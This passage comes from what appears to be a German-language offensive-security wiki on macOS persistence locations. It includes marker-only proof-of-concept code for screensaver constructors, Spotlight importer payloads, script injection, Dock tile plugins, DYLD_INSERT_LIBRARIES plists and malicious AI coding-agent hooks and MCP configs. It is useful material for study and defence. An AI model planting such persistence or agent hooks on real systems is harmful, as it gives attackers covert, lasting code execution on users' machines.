2023-09-27 22:55:39.622369+0200  localhost legacyScreenSaver[41737]: (ScreenSaverExample) hello_screensaver void custom(int, const char **)
2023-09-27 22:55:39.622623+0200  localhost legacyScreenSaver[41737]: (ScreenSaverExample) hello_screensaver -[ScreenSaverExampleView initWithFrame:isPreview:]
2023-09-27 22:55:39.622704+0200  localhost legacyScreenSaver[41737]: (ScreenSaverExample) hello_screensaver -[ScreenSaverExampleView hasConfigureSheet]
```

> [!CAUTION]
> Beachte, dass du dich **innerhalb der allgemeinen Application-Sandbox** befindest, da du in den Entitlements der Binary, die diesen Code lädt (`/System/Library/Frameworks/ScreenSaver.framework/PlugIns/legacyScreenSaver.appex/Contents/MacOS/legacyScreenSaver`), **`com.apple.security.app-sandbox`** findest.

Bildschirmschoner-Code:

```objectivec
//
//  ScreenSaverExampleView.m
//  ScreenSaverExample
//
//  Created by Carlos Polop on 27/9/23.
//

#import "ScreenSaverExampleView.h"

@implementation ScreenSaverExampleView

- (instancetype)initWithFrame:(NSRect)frame isPreview:(BOOL)isPreview
{
    NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
    self = [super initWithFrame:frame isPreview:isPreview];
    if (self) {
        [self setAnimationTimeInterval:1/30.0];
    }
    return self;
}

- (void)startAnimation
{
    NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
    [super startAnimation];
}

- (void)stopAnimation
{
    NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
    [super stopAnimation];
}

- (void)drawRect:(NSRect)rect
{
    NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
    [super drawRect:rect];
}

- (void)animateOneFrame
{
    NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
    return;
}

- (BOOL)hasConfigureSheet
{
    NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
    return NO;
}

- (NSWindow*)configureSheet
{
    NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
    return nil;
}

__attribute__((constructor))
void custom(int argc, const char **argv) {
    NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
}

@end
```

### Spotlight Plugins

writeup: [https://theevilbit.github.io/beyond/beyond_0011/](https://theevilbit.github.io/beyond/beyond_0011/)<sup>[[25]](#references)</sup>

- Nützlich, um sandbox zu umgehen: [🟠](https://emojipedia.org/large-orange-circle)
  - Allerdings landest du in einer Application-Sandbox
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)
  - Die Sandbox wirkt sehr eingeschränkt

#### Speicherort

- `~/Library/Spotlight/`
  - **Auslöser**: Eine neue Datei mit einer vom Spotlight-Plugin verwalteten Erweiterung wird erstellt.
- `/Library/Spotlight/`
  - **Auslöser**: Eine neue Datei mit einer vom Spotlight-Plugin verwalteten Erweiterung wird erstellt.
  - Root-Rechte erforderlich
- `/System/Library/Spotlight/`
  - **Auslöser**: Eine neue Datei mit einer vom Spotlight-Plugin verwalteten Erweiterung wird erstellt.
  - Root-Rechte erforderlich
- `Some.app/Contents/Library/Spotlight/`
  - **Auslöser**: Eine neue Datei mit einer vom Spotlight-Plugin verwalteten Erweiterung wird erstellt.
  - Neue App erforderlich

#### Beschreibung & Exploitation

Spotlight ist die in macOS integrierte Suchfunktion. Sie soll Nutzern **schnellen und umfassenden Zugriff auf Daten auf ihren Computern** ermöglichen.\
Damit diese schnelle Suche möglich ist, verwaltet Spotlight eine **proprietäre Datenbank** und erstellt einen Index, indem es **die meisten Dateien analysiert**. So lassen sich Dateinamen und Dateiinhalte schnell durchsuchen.<sup>[[25]](#references)</sup>

Der zugrunde liegende Spotlight-Mechanismus umfasst einen zentralen Prozess namens „mds“, kurz für **„metadata server“**. Dieser Prozess koordiniert den gesamten Spotlight-Dienst. Ergänzend dazu führen mehrere „mdworker“-Daemons verschiedene Wartungsaufgaben aus, etwa die Indizierung unterschiedlicher Dateitypen (`ps -ef | grep mdworker`). Diese Aufgaben werden durch Spotlight-Importer-Plugins, sogenannte **„.mdimporter bundles“**, ermöglicht. Sie helfen Spotlight, Inhalte in einer Vielzahl von Dateiformaten zu verstehen und zu indizieren.

Die Plugins oder **`.mdimporter`**-Bundles befinden sich an den zuvor genannten Speicherorten. Ein neues Bundle muss erkannt werden und einem Dateityp entsprechen. Außerdem muss Spotlight tatsächlich eine passende Datei indizieren. Das bloße Kopieren eines Bundles beweist nicht, dass es geladen wurde. [Apples MDImporter-Referenz](https://developer.apple.com/documentation/coreservices/file_metadata/mdimporter) verknüpft das Laden mit einer geeigneten geänderten Datei. Die Ausführung von Spotlight-Importern unter macOS 26 wurde hier nicht getestet.

Es ist möglich, **alle geladenen `mdimporters`** mit folgendem Befehl zu finden:

```bash
mdimport -L
Paths: id(501) (
    "/System/Library/Spotlight/iWork.mdimporter",
    "/System/Library/Spotlight/iPhoto.mdimporter",
    "/System/Library/Spotlight/PDF.mdimporter",
    [...]
```

Und beispielsweise wird **/Library/Spotlight/iBooksAuthor.mdimporter** verwendet, um diese Dateitypen (unter anderem mit den Erweiterungen `.iba` und `.book`) zu parsen:

```json
plutil -p /Library/Spotlight/iBooksAuthor.mdimporter/Contents/Info.plist

[...]
"CFBundleDocumentTypes" => [
    0 => {
      "CFBundleTypeName" => "iBooks Author Book"
      "CFBundleTypeRole" => "MDImporter"
      "LSItemContentTypes" => [
        0 => "com.apple.ibooksauthor.book"
        1 => "com.apple.ibooksauthor.pkgbook"
        2 => "com.apple.ibooksauthor.template"
        3 => "com.apple.ibooksauthor.pkgtemplate"
      ]
      "LSTypeIsPackage" => 0
    }
  ]
[...]
 => {
      "UTTypeConformsTo" => [
        0 => "public.data"
        1 => "public.composite-content"
      ]
      "UTTypeDescription" => "iBooks Author Book"
      "UTTypeIdentifier" => "com.apple.ibooksauthor.book"
      "UTTypeReferenceURL" => "http://www.apple.com/ibooksauthor"
      "UTTypeTagSpecification" => {
        "public.filename-extension" => [
          0 => "iba"
          1 => "book"
        ]
      }
    }
[...]
```

> [!CAUTION]
> Wenn du das Plist eines anderen `mdimporter` überprüfst, findest du möglicherweise keinen Eintrag **`UTTypeConformsTo`**. Das liegt daran, dass es sich um einen integrierten _Uniform Type Identifier_ ([UTI](https://en.wikipedia.org/wiki/Uniform_Type_Identifier)) handelt, für den keine Erweiterungen angegeben werden müssen.
>
> Außerdem haben standardmäßige System-Plugins immer Vorrang. Ein Angreifer kann daher nur auf Dateien zugreifen, die nicht bereits von Apples eigenen `mdimporters` indiziert werden.

Um einen eigenen Importer zu erstellen, kannst du mit diesem Projekt beginnen: [https://github.com/megrimm/pd-spotlight-importer](https://github.com/megrimm/pd-spotlight-importer). Ändere anschließend den Namen und **`CFBundleDocumentTypes`**, und füge **`UTImportedTypeDeclarations`** hinzu, damit die gewünschte Dateierweiterung unterstützt wird. Berücksichtige sie außerdem in **`schema.xml`**.\
Ändere dann den Code der Funktion **`GetMetadataForFile`**, damit sie deine Payload ausführt, sobald eine Datei mit der verarbeiteten Erweiterung erstellt wird.

Zum Schluss **erstelle und kopiere deinen neuen `.mdimporter`** an einen der drei zuvor genannten Speicherorte. Ob er geladen wurde, kannst du **durch Überwachen der Logs** oder mit **`mdimport -L`** überprüfen.

> [!TIP]
> Obwohl die Sandbox des Importers sehr restriktiv ist, indiziert `mdworker` Dateien mit **privilegiertem Lesezugriff**. Ein bösartiger `.mdimporter` kann daher den *Inhalt* von Dateien an TCC-geschützten Speicherorten (Downloads, Pictures, Desktop, …) auslesen und erfasste Metadaten ohne TCC-Abfrage nach außen übertragen — der **„Sploitlight“-TCC-Bypass (CVE-2025-31199)**, der in macOS Sequoia 15.4 behoben wurde.<sup>[[55]](#references)</sup>

Die separate macOS-26-Technik, geschützte Bytes in **Darwin-Benachrichtigungsnamen** statt in System-Logs zu übertragen, wird hier beschrieben: [Spotlight importer leakage via Darwin notification names](macos-security-and-privilege-escalation/macos-security-protections/macos-tcc/macos-tcc-bypasses/#spotlight-importer-leakage-via-darwin-notification-names).<sup>[[57]](#references)</sup>

### ~~Einstellungsbereich~~

> [!CAUTION]
> Es sieht so aus, als würde das nicht mehr funktionieren.

Writeup: [https://theevilbit.github.io/beyond/beyond_0009/](https://theevilbit.github.io/beyond/beyond_0009/)<sup>[[26]](#references)</sup>

- Nützlich zum Umgehen der Sandbox: [🟠](https://emojipedia.org/large-orange-circle)
  - Eine bestimmte Benutzeraktion ist erforderlich
- TCC-Bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Speicherort

- **`/System/Library/PreferencePanes`**
- **`/Library/PreferencePanes`**
- **`~/Library/PreferencePanes`**

#### Beschreibung

Es sieht so aus, als würde das nicht mehr funktionieren.<sup>[[26]](#references)</sup>

### Anwendungs-Skriptdateien

Writeup: [https://theevilbit.github.io/beyond/beyond_0010/](https://theevilbit.github.io/beyond/beyond_0010/)<sup>[[37]](#references)</sup>

- Nützlich zum Umgehen der Sandbox: [✅](https://emojipedia.org/check-mark-button)
  - Die gezielte Anwendung muss jedoch installiert sein und vom Opfer ausgeführt/verwendet werden
- TCC-Bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Speicherort

Ein **interpretiertes Skript, das eine installierte Anwendung oder ein installiertes Tool tatsächlich ausführt** und das der Akteur ändern kann. Überprüfe die Dateiberechtigungen und den Aufrufpfad; eine gefundene `.sh`- oder `.py`-Datei allein reicht nicht aus. Apples [Code-Signing-Leitfaden](https://developer.apple.com/library/archive/documentation/Security/Conceptual/CodeSigningGuide/Procedures/Procedures.html) besagt, dass signierte App-Bundles Ressourcen einschließlich Skripten versiegeln. Eine Änderung an einem Skript im Bundle bricht diese Versiegelung und kann bei der Validierung des Bundles erkannt oder blockiert werden. Ein externes Skript wie der Homebrew-Launcher unterliegt anderen Signatur- und Vertrauensregeln. Zu den historischen Beispielen aus dem Writeup gehören:

- **`/Applications/Sublime Text.app/Contents/MacOS/sublime.py`** – ein Skript, das von älteren Sublime-Text-Versionen verwendet wurde; die Datei und ihre Verwendung beim Start müssen für die installierte Version überprüft werden. Auf dem Test-Mac war sie nicht vorhanden.
- **`/opt/homebrew/bin/brew`** (Apple Silicon) oder **`/usr/local/bin/brew`** (Intel) – ein Bash-Launcher, der ausgeführt wird, wenn der entsprechende `brew`-Pfad aufgerufen wird, sofern er installiert und für den Akteur beschreibbar ist. Auf dem Test-Mac war `/opt/homebrew/bin/brew` ein beschreibbares Bash-Skript; dies ist eine lokale Beobachtung und keine allgemeine Berechtigungsregel für Homebrew.
- **IDLEs `idlemain.py`** in einem Python-App-Bundle – zum Schreiben sind möglicherweise Administratorrechte erforderlich, das Skript wird jedoch mit der Identität des IDLE-Benutzers ausgeführt.
- **`/Library/Application Support/Wireshark/ChmodBPF/ChmodBPF`** – ein historisches Shell-Skript, das als Root ausgeführt wird, wenn der entsprechende launchd-Job `org.wireshark.ChmodBPF` installiert ist. Das Skript und der Job waren auf dem Test-Mac nicht vorhanden.

#### Beschreibung & Ausnutzung

Einige Tools und Apps führen zur Laufzeit interpretierte Skripte aus. Ein beschreibbares Skript kann zusätzliche Befehle ausführen, wenn sein spezifischer Aufrufer das nächste Mal gestartet wird, sofern Signaturvalidierung, Quarantäne und andere Prüfungen dies zulassen. Die ursprüngliche Recherche zeigte mehrere Installationen aus dem Jahr 2019; überprüfe ihre Pfade und Auslöser für die Zielversion erneut.<sup>[[37]](#references)</sup>

```python
# Marker-only injection test on a COPY of Homebrew's launcher. The relocated
# copy may fail its normal Homebrew logic; the marker checks script execution.
import pathlib, subprocess, tempfile

source = pathlib.Path('/opt/homebrew/bin/brew')
with tempfile.TemporaryDirectory(prefix='ht-script-copy-') as root:
    target = pathlib.Path(root) / 'brew'
    marker = pathlib.Path(root) / 'ran'
    lines = source.read_text().splitlines(keepends=True)
    target.write_text(lines[0] + '/usr/bin/touch ' + str(marker) + '\n' + ''.join(lines[1:]))
    target.chmod(0o700)
    subprocess.run([str(target), '--version'], capture_output=True, timeout=15)
    print('marker fired:', marker.exists())
```

Dieser Kopiertest ergab unter macOS 26.5.2 `marker fired: True`; der ursprüngliche Launcher blieb unangetastet. Er belegt, dass der Einfügepunkt in der Kopie ausgeführt wird, nicht aber, dass ein modifiziertes, signiertes App-Bundle oder eine echte Homebrew-Installation alle Startprüfungen bestehen würde.

### Dock Tile Plugins

Writeup: [https://theevilbit.github.io/beyond/beyond_0032/](https://theevilbit.github.io/beyond/beyond_0032/)<sup>[[38]](#references)</sup>

- Nützlich, um die Sandbox zu umgehen: [✅](https://emojipedia.org/check-mark-button)
  - Erfordert, dass eine App das Plug-in deklariert, damit es vom Dock gefunden/registriert und verarbeitet wird
  - Das Plug-in wird in einen **von Apple signierten** Helper geladen, der keine App-Sandbox-Berechtigung hat und bei dem die **Library Validation deaktiviert** ist. Dieser Helper wurde in der in der zitierten Untersuchung beschriebenen Benutzeroberfläche für die Background Task Management nicht angezeigt; die Sichtbarkeit in der jeweiligen Zielversion sollte geprüft werden.
- TCC-Bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Speicherort

- **`<App>.app/Contents/PlugIns/<name>.docktileplugin`**, über den Schlüssel **`NSDockTilePlugIn`** in der `Info.plist` der App referenziert; die eigene `Info.plist` des Plug-ins legt **`NSPrincipalClass`** fest.

#### Beschreibung & Ausnutzung

Wenn eine App `NSDockTilePlugIn` deklariert, kann das Dock das referenzierte Bundle beim Anmelden oder beim Hinzufügen des App-Symbols in den XPC-Helper **`com.apple.dock.external.extra`** laden (`...extra.arm64` auf Apple Silicon); die App selbst muss nicht gestartet werden. Dazu muss die App von macOS gefunden/registriert und akzeptiert werden. Der Helper ist **von Apple signiert**, hat keine Berechtigung `com.apple.security.app-sandbox` und verfügt über `com.apple.security.cs.disable-library-validation`. Beim Laden wird die Methode **`setDockTile:`** der Hauptklasse aufgerufen; von dort aus kann sie sich für spätere Ereignisse bei verteilten Benachrichtigungen (z. B. `com.apple.screenIsLocked`) registrieren.<sup>[[38]](#references)</sup>

Unter macOS 26.5.2 bestätigte eine schreibgeschützte `codesign`-Prüfung die Apple-Signatur und die Berechtigungen des Helpers; außerdem deklarierten mehrere installierte Apps `NSDockTilePlugIn`. Auf diesem Mac wurde kein neues Plug-in installiert oder geladen. Daher wurde die Ausführung eines neu geschriebenen Bundles unter dieser Version nicht getestet.

```bash
# Enumerate apps already shipping a Dock tile plugin (hijack / template targets)
for a in /Applications/*.app /System/Applications/*.app; do
  v=$(/usr/libexec/PlistBuddy -c 'Print :NSDockTilePlugIn' "$a/Contents/Info.plist" 2>/dev/null) \
    && echo "$a -> $v"
done
# e.g. on macOS 26: Calendar.app, App Store.app, System Settings.app, plus 3rd-party Warp.app / ChatGPT.app
```

```objc
// Principal class, built as MyPlugin.docktileplugin, placed in <App>.app/Contents/PlugIns/
// App Info.plist:    NSDockTilePlugIn = MyPlugin.docktileplugin
// Plugin Info.plist: NSPrincipalClass = MyDockPlugin , CFBundlePackageType = BNDL
@interface MyDockPlugin : NSObject <NSDockTilePlugIn>
@end
@implementation MyDockPlugin
- (void)setDockTile:(NSDockTile *)dockTile {
    system("touch /tmp/hacktricks_docktile");   // runs when the tile is added to the Dock / at login
}
@end
```

### Widgets (Notification Center / WidgetKit)

Writeup: [https://theevilbit.github.io/beyond/beyond_0033/](https://theevilbit.github.io/beyond/beyond_0033/)<sup>[[39]](#references)</sup>

- Nützlich zum Umgehen der Sandbox: [✅](https://emojipedia.org/check-mark-button)
  - Die Widget-Erweiterung läuft in **ihrem eigenen Prozess**, und durch das Hinzufügen einer Erweiterung wird **kein** Background Task Management alert ausgelöst
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)
  - Die Konfigurations-plist befindet sich in einem TCC-geschützten Container. Änderungen daran von außerhalb erfordern daher Full Disk Access oder einen TCC bypass

#### Speicherort

- Widget-Erweiterungs-Bundle: **`<App>.app/Contents/PlugIns/<Widget>.appex`**
- Aktive/registrierte Widgets: **`~/Library/Containers/com.apple.notificationcenterui/Data/Library/Preferences/com.apple.notificationcenterui.plist`** (Schlüssel `widgets.instances` und `widgets.widgets`)

#### Beschreibung und Exploitation

Eine in einer App enthaltene WidgetKit-Erweiterung läuft in **ihrem eigenen Prozess**, der vom Notification Center verwaltet wird. Wenn eine Instanz in `widgets.instances` registriert wird (ein base64-kodierter `NSKeyedArchiver`-Blob vom Typ `CHSWidget` mit eingebetteten `INIntent`-Daten) und NotificationCenter neu gestartet wird, wird das Widget geladen und sein `TimelineProvider`-/Intent-Code ausgeführt.<sup>[[39]](#references)</sup>

```bash
# Inspect currently-registered widgets (file present on stock macOS)
plutil -p ~/Library/Containers/com.apple.notificationcenterui/Data/Library/Preferences/com.apple.notificationcenterui.plist \
  | grep -iE "widgets?\." | head
```

### Mail.app-Regeln (AppleScript ausführen)

Writeup: [https://www.n00py.io/2016/10/using-email-for-persistence-on-os-x/](https://www.n00py.io/2016/10/using-email-for-persistence-on-os-x/)<sup>[[42]](#references)</sup>

- Nützlich, um die Sandbox zu umgehen: [✅](https://emojipedia.org/check-mark-button)
  - Mail.app muss jedoch mit einem konfigurierten Account laufen; der Auslöser ist eine eingehende E-Mail
- TCC-Umgehung: [🔴](https://emojipedia.org/large-red-circle)
  - Zum Bearbeiten der Regeln/Skripte außerhalb von Mail muss Mail möglicherweise geschlossen sein; unter modernen macOS-Versionen ist außerdem Full Disk Access erforderlich

#### Speicherort

- **`~/Library/Mail/V10/MailData/SyncedRules.plist`** (lokale Regeln; `V10` unter Sonoma/Sequoia, `V11`+ unter neueren Versionen)
- **`~/Library/Mobile Documents/com~apple~mail/Data/V10/MailData/ubiquitous_SyncedRules.plist`** (mit iCloud synchronisierte Regeln, haben Vorrang)
- Regeln aktivieren: **`RulesActiveState.plist`**; AppleScript-Payload: **`~/Library/Application Scripts/com.apple.mail/*.scpt`**

#### Beschreibung & Ausnutzung

Eine Apple-Mail-**Regel** kann die Aktion *„AppleScript ausführen“* enthalten. Indem eine Regel hinzugefügt wird, die auf eine präparierte **Betreffzeile** passt und ein Angreifer-Skript ausführt, erhält der Angreifer **remote auslösbare, unauffällige** Codeausführung im Kontext von Mail, sobald die entsprechende E-Mail eintrifft – ein Angriffsvektor, der viele Persistenz-Scanner umgeht, da kein LaunchAgent/Login Item erstellt wird.<sup>[[42]](#references)</sup> Wird die Regel so eingestellt, dass sie die Auslöser-E-Mail auch **löscht**, bleibt der Beweis verborgen. Verteidiger können gezielt danach suchen:<sup>[[43]](#references)</sup>

```bash
# Enumerate Mail rules that invoke AppleScript
grep -A1 -i "AppleScript" ~/Library/Mail/V*/MailData/SyncedRules.plist 2>/dev/null
plutil -p ~/Library/Mail/V*/MailData/SyncedRules.plist 2>/dev/null | grep -iE "AppleScript|ShouldTransfer|Delete"
```

### Konfigurationsprofile (.mobileconfig)

Writeup: [https://www.jamf.com/blog/malicious-profiles-come/](https://www.jamf.com/blog/malicious-profiles-come/)<sup>[[44]](#references)</sup>

- Nützlich, um die Sandbox zu umgehen: [🔴](https://emojipedia.org/large-red-circle)
  - Moderne macOS-Versionen erfordern eine **manuelle Benutzerfreigabe** unter Systemeinstellungen → *Geräteverwaltung* (die stille Installation mit `profiles install` ist außerhalb von MDM nicht mehr möglich)
- TCC-Umgehung: [🔴](https://emojipedia.org/large-red-circle)

#### Speicherort

- Installierte Profile befinden sich unter **`/Library/Managed Preferences/`** und **`/var/db/ConfigurationProfiles/`**; ein Profil ist eine XML-plist mit einem `PayloadContent`-Array.

#### Beschreibung & Ausnutzung

Eine `.mobileconfig` ist kein direkter Codeausführungsmechanismus, kann aber Konfigurationen wie eine **vertrauenswürdige Root-CA** (`com.apple.security.root`), einen **globalen Proxy oder PAC-Proxy** (`com.apple.proxy.*`), **verwaltete Einstellungen** (`com.apple.ManagedClient.preferences`) oder Einschränkungen persistent speichern. Unter macOS 10.15 und neuer besagt Apples Definition von [`PayloadRemovalDisallowed`](https://developer.apple.com/documentation/devicemanagement/toplevel), dass bei einer **manuell installierten** Konfiguration mit diesem Parameter auf `true` und ohne Payload zum Entfernen per Passwort eine **Administratorauthentifizierung** erforderlich ist, um sie zu entfernen; dadurch wird das Profil nicht absolut unentfernbar. Für MDM-installierte Profile gelten gesonderte Verwaltungs- und Entfernungsregeln.<sup>[[44]](#references)</sup>

> [!WARNING]
> Ein einfaches Konfigurationsprofil hat **keinen Payload-Typ, der beliebige `LaunchDaemon`/`LaunchAgent` installiert**. Die Installation eines Daemons auf diesem Weg erfordert eine vollständige **MDM-Registrierung** sowie einen Verwaltungsagenten/ein Skript — `.mobileconfig` sollte nicht als Zustellungsmechanismus für launchd betrachtet werden.

```bash
# Inspect installed profiles (user context)
profiles list            # per-user
sudo profiles show       # system (root)
```

### DYLD_INSERT_LIBRARIES-Persistenz

- Nützlich, um die Sandbox zu umgehen: [🔴](https://emojipedia.org/large-red-circle)
  - dyld **entfernt** `DYLD_*`-Variablen bei SIP-/Plattform-Binaries, Apps mit Hardened Runtime und setuid-Zielen. Daher injiziert es nur in ungeschützte Prozesse und umgeht **weder** SIP **noch** die Hardened Runtime.
- TCC-Umgehung: [🔴](https://emojipedia.org/large-red-circle)

#### Speicherort

- Zuverlässige Variante: das **`EnvironmentVariables`**-Dict innerhalb einer bösartigen `LaunchAgent`-/`LaunchDaemon`-plist (wird bei der Anmeldung/beim Booten ausgeführt)
- Veraltet/historisch (nur der Vollständigkeit halber): **`~/.MacOSX/environment.plist`** (in 10.8 entfernt) und **`/etc/launchd.conf`** (in 10.10 entfernt)

#### Beschreibung & Ausnutzung

Wenn ein Angreifer `DYLD_INSERT_LIBRARIES` in die Umgebung eines Opferprozesses einschleusen kann, lädt dyld die dylib des Angreifers in diesen Prozess (ihr Constructor wird ausgeführt). Bei der persistenten Variante wird die Variable in einen LaunchAgent eingebettet, sodass jeder Start des Jobs sie erneut injiziert. Beachte, dass `launchctl setenv DYLD_*` unter modernen macOS-Versionen gefiltert wird. Bette sie daher stattdessen in die plist ein.<sup>[[45]](#references)</sup>

```xml
<key>EnvironmentVariables</key>
<dict>
    <key>DYLD_INSERT_LIBRARIES</key>
    <string>/tmp/evil.dylib</string>
</dict>
```

Die vollständige Funktionsweise von dylib injection/hijacking finden Sie hier:

{{#ref}}
macos-security-and-privilege-escalation/macos-proces-abuse/macos-library-injection/macos-dyld-hijacking-and-dyld_insert_libraries.md
{{#endref}}

### AI-Coding-Agent-CLIs (Hooks, MCP-Server, Regeldateien)

Berichte: [CVE-2025-59536 (Check Point)](https://research.checkpoint.com/2026/rce-and-api-token-exfiltration-through-claude-code-project-files-cve-2025-59536/)<sup>[[47]](#references)</sup>, [Hintertür in Regeldatei (Pillar Security)](https://www.pillar.security/blog/new-vulnerability-in-github-copilot-and-cursor-how-hackers-can-weaponize-code-agents)<sup>[[48]](#references)</sup>

- Nützlich zum Umgehen der Sandbox: [✅](https://emojipedia.org/check-mark-button)
  - Erfordert, dass der Entwickler den betreffenden Agenten verwendet. Startbefehle werden mit den Berechtigungen des jeweiligen Benutzers ausgeführt, wenn der Agent seine Konfiguration akzeptiert; Workspace-Vertrauen und MCP-Genehmigungen unterscheiden sich je nach Produkt und Sitzungsmodus.
- TCC-Bypass: [🔴](https://emojipedia.org/large-red-circle) (wird als Benutzer ausgeführt; übernimmt alle Berechtigungen, die das Terminal/der Agent bereits hat)

#### Speicherorte

Explizite Hook- und MCP-Konfigurationsdateien können bewirken, dass **Shell-Befehle oder untergeordnete Prozesse ausgeführt werden, wenn der Entwickler das Tool verwendet** – entweder über eine globale Datei pro Benutzer (Persistenz) oder über eine in einem Repository eingecheckte Datei (Supply-Chain). `CLAUDE.md`, `AGENTS.md`, `GEMINI.md` und Editor-Regeln sind **Anweisungen an einen Agenten**, keine garantierte Shell-Ausführung beim Lesen; ihre Wirkung hängt vom Verhalten des Agenten und den Tool-Berechtigungen ab. Prüfen Sie die aktuellen Vertrauens- und Genehmigungsregeln für jedes Produkt.

- **Claude Code**
  - `~/.claude/settings.json`, projektbezogenes `.claude/settings.json`, `.claude/settings.local.json` sowie die nur für root zugängliche **`/Library/Application Support/ClaudeCode/managed-settings.json`** (MDM-/verwaltete Einstellungen **können nicht vom Benutzer überschrieben werden** → starke Persistenz)
  - `hooks`-Objekt – Ereignisse `PreToolUse`, `PostToolUse`, `UserPromptSubmit`, `Stop`, `SubagentStop`, `SessionStart`, `SessionEnd`, `Notification`, `PreCompact` – jedes führt einen Shell-`command` aus
  - `statusLine.command` – ein Shell-Befehl, der zum Anzeigen der Statuszeile ausgeführt wird (bei jeder Sitzung)
  - MCP-Server in `~/.claude.json` / projektbezogenem `.mcp.json` – `command`+`args` werden als untergeordnete Prozesse gestartet
  - `CLAUDE.md` / `~/.claude/CLAUDE.md` – Anweisungen, die eine Prompt Injection versuchen können; abhängig vom Verhalten des Agenten und den Tool-Berechtigungen
- **OpenAI Codex CLI**: `~/.codex/config.toml` `[mcp_servers.*]` (`command`/`args` werden als untergeordnete Prozesse gestartet); Projektanweisungen in `AGENTS.md`
- **Gemini CLI**: `~/.gemini/settings.json` (`hooks`, MCP-Server); `GEMINI.md`
- **Cursor**: `~/.cursor/hooks.json` (`beforeShellExecution`, `afterAgentResponse`, `stop`, … führen Befehle aus); `.cursor/rules/`, `.cursorrules`, `~/.cursor/mcp.json`; GitHub Copilot `.github/copilot-instructions.md`

#### Beschreibung und Ausnutzung

Wenn ein Angreifer die globalen Benutzereinstellungen eines Kontos ändern kann, können dessen Hook- oder MCP-Befehle in künftigen Sitzungen unter diesem Konto ausgeführt werden. Eine vom Repository kontrollierte Konfiguration ist ein gesonderter Fall: Die [aktuellen Sicherheitsdokumente von Claude Code](https://code.claude.com/docs/en/security) beschreiben einen interaktiven Dialog zum Vertrauen in den Workspace sowie eine separate Genehmigungsaufforderung für Server in `.mcp.json` des Projekts. Die [Berechtigungsmatrix](https://code.claude.com/docs/en/permissions#what-runs-before-you-trust-a-folder) besagt, dass Hooks ausgeführt werden können, nachdem einem übergeordneten Ordner vertraut wurde, und dass in `claude -p`-/SDK-Sitzungen keine interaktive Vertrauensabfrage angezeigt wird; in diesen nicht interaktiven Modi werden Projekt-MCP-Server ohne Genehmigungsabfrage verbunden. Die für CVE-2025-59536 gemeldete Umgehung des Projekt-Hooks vor dem Vertrauensdialog wurde [2025 behoben](https://research.checkpoint.com/2026/rce-and-api-token-exfiltration-through-claude-code-project-files-cve-2025-59536/); betrachten Sie sie nicht als aktuelles Standardverhalten. Zu den Verbreitungswegen können ein kompromittiertes Repository oder ein bösartiges Installationsprogramm gehören. Prompt Injection über Regeldateien ist weniger vorhersehbar als ein expliziter Hook und hängt weiterhin von Tool-Genehmigungen ab.<sup>[[47]](#references)</sup><sup>[[48]](#references)</sup>

Beispiel für globale Claude-Code-Einstellungen eines Benutzers; verwenden Sie diese zum Testen ausschließlich in einem entbehrlichen Konto:

```json
{
  "hooks": {
    "SessionStart": [
      { "hooks": [ { "type": "command", "command": "touch /tmp/hacktricks_claude_hook" } ] }
    ]
  },
  "statusLine": { "type": "command", "command": "touch /tmp/hacktricks_statusline; echo HT" }
}
```

Beispiel für eine benutzerweite Codex-MCP-Konfiguration:

```toml
[mcp_servers.evil]
command = "/bin/sh"
args = ["-c", "touch /tmp/hacktricks_codex_mcp; exec real-mcp-server"]
```

Beispiel für eine Cursor-Hook-Konfiguration; vor der Verwendung das Schema der installierten Version prüfen:

```json
{ "version": 1, "hooks": { "beforeShellExecution": [ { "command": "touch /tmp/hacktricks_cursor_hook" } ] } }
```

```bash
# Defensive audit: which agent configs can auto-run commands?
ls -la .claude/settings*.json .mcp.json ~/.claude/settings.json ~/.claude.json \
       ~/.codex/config.toml ~/.gemini/settings.json ~/.cursor/hooks.json \
       ~/.cursor/mcp.json .cursor/rules .cursorrules .github/copilot-instructions.md 2>/dev/null
python3 -c 'import json;d=json.load(open("'"$HOME"'/.claude/settings.json"));print("claude hooks:",list(d.get("hooks",{}).keys()),"statusLine:",bool(d.get("statusLine")))' 2>/dev/null
```

### Browser-Erweiterungen (Chromium: Chrome / Brave / Edge)

Writeup: [Externe Chrome-Erweiterungen](https://developer.chrome.com/docs/extensions/how-to/distribute/install-extensions)<sup>[[49]](#references)</sup>, [Missbrauch von ExtensionInstallForcelist unter macOS](https://macsecurity.net/view/492-extensioninstallforcelist-chrome-policy-mac)<sup>[[50]](#references)</sup>

- Nützlich zum Umgehen der Sandbox: [✅](https://emojipedia.org/check-mark-button)
  - Erfordert einen unterstützten Browser und eine installierte, aktivierte Erweiterung. Externe Erweiterungen unter macOS erfordern eine Bestätigung durch den Benutzer; eine erzwungene Installation per Verwaltungsrichtlinie erfordert eine entsprechende Unternehmensrichtlinie.
- TCC-Umgehung: [🔴](https://emojipedia.org/large-red-circle)

> [!NOTE]
> Dies unterscheidet sich von **native messaging hosts** (siehe den obigen Abschnitt *Chrome native messaging hosts*). Hier ist die **automatisch installierte Erweiterung** selbst der Persistenzmechanismus.

#### Speicherort

- **JSON-Datei für externe Erweiterungen** (wird beim Browserstart erkannt und erfordert unter macOS anschließend eine Aktivierungsaufforderung):
  - Chrome: `~/Library/Application Support/Google/Chrome/External Extensions/<extID>.json` (pro Benutzer) oder `/Library/Application Support/Google/Chrome/External Extensions/` (alle Benutzer)
  - Brave: `~/Library/Application Support/BraveSoftware/Brave-Browser/External Extensions/`
  - Edge: `~/Library/Application Support/Microsoft Edge/External Extensions/`
- **Erzwungene Installation per Unternehmensrichtlinie** über verwaltete Einstellungen / ein Konfigurationsprofil:
  - Schlüssel `ExtensionInstallForcelist` unter `com.google.Chrome` (`com.brave.Browser` für Brave, `com.microsoft.Edge` für Edge), ausgelesen aus `/Library/Managed Preferences/` oder einer installierten `.mobileconfig`

#### Beschreibung & Ausnutzung

